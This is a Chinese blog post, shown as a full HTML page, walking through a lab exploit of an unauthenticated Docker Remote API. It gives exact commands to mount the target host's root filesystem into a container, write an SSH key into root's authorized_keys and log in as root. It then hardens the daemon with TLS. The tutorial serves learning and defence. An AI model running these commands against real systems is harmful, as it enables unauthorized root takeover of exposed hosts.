<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Docker Remote API未授权访问漏洞以及安全防护 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Docker Remote API未授权访问漏洞以及安全防护" />
<meta property="og:description" content="一、拓扑图 二、环境与配置 环境 设备
IP地址
操作类型
docker版本
镜像
训练机
192.168.0.2
centos7
18.03.1-ce
*
靶机
192.168.0.3
Ubuntu
24.0.4
至少一个容器镜像
靶机配置 执行vi /usr/lib/systemd/system/docker.service命令对靶机docker服务进行配置
执行 ExecStart=/usr/bin/dockerd -H unix:///var/run/docker.sock -H tcp://192.168.0.3:2375命令编辑docker.service文件，开启 Docker daemon 的远程访问，也就允许Docker daemon 进行本地和远程通信
三、背景 在使用Docker Swarm中，管理Docker的节点默认会启动一个API服务，并且将2375作为默认端口，0.0.0.0绑定为默认可以访问到API的IP。因为API是可以执行Docker命令的，所以暴露在公网上就非常危险。如果目标是以root权限运行的Docker，那么就可以利用Docker能挂载宿主机的物理路径到容器中来写入ssh公钥来获取shell。
四、API测试 4.1执行docker -H tcp://192.168.0.3:2375 version命令查看靶机docker版本
4.2执行docker -H tcp://192.168.0.3:2375 images命令查看靶机docker下容器镜像
五、漏洞利用 5.1执行docker -H tcp://192.168.0.3:2375 run -it -v /:/mnt ubuntu /bin/bash命令将靶机的/路径挂载到容器的/mnt路径下
5.2新建一个训练机的终端，执行ssh-keygen -t rsa命令生成秘钥对
5.3执行cat /root/.ssh/id_rsa.pub查看公钥内容
5.4将公钥内容复制到文本编辑器中，然后将换行符删掉，将内容变成一行
然后切换到训练机进入容器Ubuntu的终端，在容器中输入echo &#34;删除换行符后的内容&#34; &gt;&gt;/mnt/root/.ssh/authorized_keys，命令如下:
echo &#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFPFe9B7fHccehER3gLBPWr6xEM771AH2IO8P6DYK4u/RCes/E6o4Q7jAt&#43;nLCrN8t3jJrCM6A626mr0h TuKYVGO6kxWs9lCJC8TlGv2B69fJVx7vX/HrwaBHQkPoyMq3GM7BoiFGiSJUu29qaTv/zZmxn7252yflQXeXoIqxQVWgX8OQDKlXQk6F&#43;mvvLJNZSUUVMb4FOjfViChAJ8JBOaUbK5xQbpsDjiCQX Ike7X0pHHSb5PcOLs0ZuY059NqCrboiwCglrYsevlTWLEe4FNNfyjDxsAIxW40SU7p1hl/Hd42TQdDPpw9wfmYzxMq8cwG/hadzR6dSea5bKRetB root@Server-e76b1696-2869-4f19-97dd- b5c56e217cc9." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/2c529da08c5e04e9c147b929aba82013/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-07-26T12:41:22+08:00" />
<meta property="article:modified_time" content="2023-07-26T12:41:22+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Docker Remote API未授权访问漏洞以及安全防护</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h2>一、拓扑图</h2> 
<p></p> 
<p class="img-center"><img alt="" height="331" src="https://images2.imgbox.com/f6/37/J0KBmKAc_o.png" width="1155"></p> 
<h2>二、环境与配置</h2> 
<h3>环境</h3> 
<table><tbody><tr><td> <p>设备</p> </td><td> <p>IP地址</p> </td><td> <p>操作类型</p> </td><td> <p>docker版本</p> </td><td> <p>镜像</p> </td></tr><tr><td> <p>训练机</p> </td><td> <p>192.168.0.2</p> </td><td> <p>centos7</p> </td><td> <p>18.03.1-ce</p> </td><td> <p>*</p> </td></tr><tr><td> <p>靶机</p> </td><td> <p>192.168.0.3</p> </td><td> <p>Ubuntu</p> </td><td> <p>24.0.4</p> </td><td> <p>至少一个容器镜像</p> </td></tr></tbody></table> 
<h3>靶机配置</h3> 
<p>执行vi /usr/lib/systemd/system/docker.service命令对靶机docker服务进行配置</p> 
<p class="img-center"><img alt="" height="38" src="https://images2.imgbox.com/92/90/nMdVY1JN_o.png" width="1200"></p> 
<p>执行 ExecStart=/usr/bin/dockerd -H unix:///var/run/docker.sock -H tcp://192.168.0.3:2375命令编辑docker.service文件，开启 Docker daemon 的远程访问，也就允许Docker daemon 进行本地和远程通信</p> 
<p class="img-center"><img alt="" height="619" src="https://images2.imgbox.com/c9/5a/XxPDmYQw_o.png" width="1200"></p> 
<h2>三、背景</h2> 
<p>在使用Docker Swarm中，管理Docker的节点默认会启动一个API服务，并且将2375作为默认端口，0.0.0.0绑定为默认可以访问到API的IP。因为API是可以执行Docker命令的，所以暴露在公网上就非常危险。如果目标是以root权限运行的Docker，那么就可以利用Docker能挂载宿主机的物理路径到容器中来写入ssh公钥来获取shell。</p> 
<h2>四、API测试</h2> 
<p>4.1执行docker -H tcp://192.168.0.3:2375 version命令查看靶机docker版本</p> 
<p></p> 
<p class="img-center"><img alt="" height="504" src="https://images2.imgbox.com/9f/5b/FkmmNrwQ_o.png" width="830"></p> 
<p>4.2执行docker -H tcp://192.168.0.3:2375 images命令查看靶机docker下容器镜像</p> 
<p class="img-center"><img alt="" height="97" src="https://images2.imgbox.com/6b/d4/jRXfGYia_o.png" width="830"></p> 
<h2>五、漏洞利用</h2> 
<p>5.1执行docker -H tcp://192.168.0.3:2375 run -it -v /:/mnt ubuntu /bin/bash命令将靶机的/路径挂载到容器的/mnt路径下</p> 
<p></p> 
<p class="img-center"><img alt="" height="77" src="https://images2.imgbox.com/bd/9c/EzVwTEUC_o.png" width="830"></p> 
<p>5.2新建一个训练机的终端，执行ssh-keygen -t rsa命令生成秘钥对</p> 
<p class="img-center"><img alt="" height="307" src="https://images2.imgbox.com/46/1d/vqQxHU7A_o.png" width="831"></p> 
<p>5.3执行cat /root/.ssh/id_rsa.pub查看公钥内容</p> 
<p class="img-center"><img alt="" height="58" src="https://images2.imgbox.com/64/f5/oKR7ikU2_o.png" width="829"></p> 
<p>5.4将公钥内容复制到文本编辑器中，然后将换行符删掉，将内容变成一行</p> 
<p class="img-center"><img alt="" height="47" src="https://images2.imgbox.com/00/65/Im7y19iA_o.png" width="830"></p> 
<p>然后切换到训练机进入容器Ubuntu的终端，在容器中输入echo "删除换行符后的内容" &gt;&gt;/mnt/root/.ssh/authorized_keys，命令如下:</p> 
<blockquote> 
 <pre>echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFPFe9B7fHccehER3gLBPWr6xEM771AH2IO8P6DYK4u/RCes/E6o4Q7jAt+nLCrN8t3jJrCM6A626mr0h TuKYVGO6kxWs9lCJC8TlGv2B69fJVx7vX/HrwaBHQkPoyMq3GM7BoiFGiSJUu29qaTv/zZmxn7252yflQXeXoIqxQVWgX8OQDKlXQk6F+mvvLJNZSUUVMb4FOjfViChAJ8JBOaUbK5xQbpsDjiCQX Ike7X0pHHSb5PcOLs0ZuY059NqCrboiwCglrYsevlTWLEe4FNNfyjDxsAIxW40SU7p1hl/Hd42TQdDPpw9wfmYzxMq8cwG/hadzR6dSea5bKRetB root@Server-e76b1696-2869-4f19-97dd- b5c56e217cc9.novalocal" &gt;&gt;/mnt/root/.ssh/authorized_keys </pre> 
</blockquote> 
<p class="img-center"><img alt="" height="55" src="https://images2.imgbox.com/49/b7/sD8AZ8SM_o.png" width="831"></p> 
<p>5.5再次切换到训练机终端，执行ssh root@192.168.0.3命令进行秘钥认证登录</p> 
<p class="img-center"><img alt="" height="399" src="https://images2.imgbox.com/7b/d0/H87EOgRo_o.png" width="831"></p> 
<h2>六、加固</h2> 
<p>6.1采取TLS技术进行加密认证和身份验证，执行vi /usr/lib/systemed/system/docker.service命令修改配置文件，取消14行注释，并给16行添加注释。</p> 
<p class="img-center"><img alt="" height="695" src="https://images2.imgbox.com/52/fb/io8lZ2MK_o.png" width="1200"></p> 
<p>6.2执行systemct daemon-reload和systemctl restart docker.service命令重启docker服务</p> 
<p class="img-center"><img alt="" height="42" src="https://images2.imgbox.com/db/9c/gv79OlML_o.png" width="830"></p> 
<h2>七、验证</h2> 
<p>7.1训练机终端执行docker -H tcp://192.168.0.3:2376 run -it -v /:mnt ubuntu /bin/bash命令，发现无法进入靶机Ubuntu容器内</p> 
<p class="img-center"><img alt="" height="61" src="https://images2.imgbox.com/1f/cf/pcxGYKRn_o.png" width="830"></p> 
<p>7.2执行 docker --tlsverify --tlscacert=/etc/docker/ca.pem --tlscert=/etc/docker/client-cert.pem --tlskey=/etc/docker/client-key.pem -H tcp://master:2376 run -it -v /:/mnt ubuntu /bin/bash命令，</p> 
<p>使用证书再次进行验证，发现成功进入靶机Ubuntu容器内</p> 
<p class="img-center"><img alt="" height="568" src="https://images2.imgbox.com/2c/6b/IOymMX1A_o.png" width="1200"></p> 
<p>注意：tcp://master采用了本地主机名解析技术，也就是将IP地址192.168.0.3和主机名master的映射关系写入到了训练机/etc/hosts文件中了。</p> 
<p></p> 
<p></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/a566cae227221ca3f78015cee47b3a04/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">MacOS解决zsh: command not found: vue</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/3182360d907db84d701f63b914795661/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">linux下C语言实现进程通信与共享内存</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>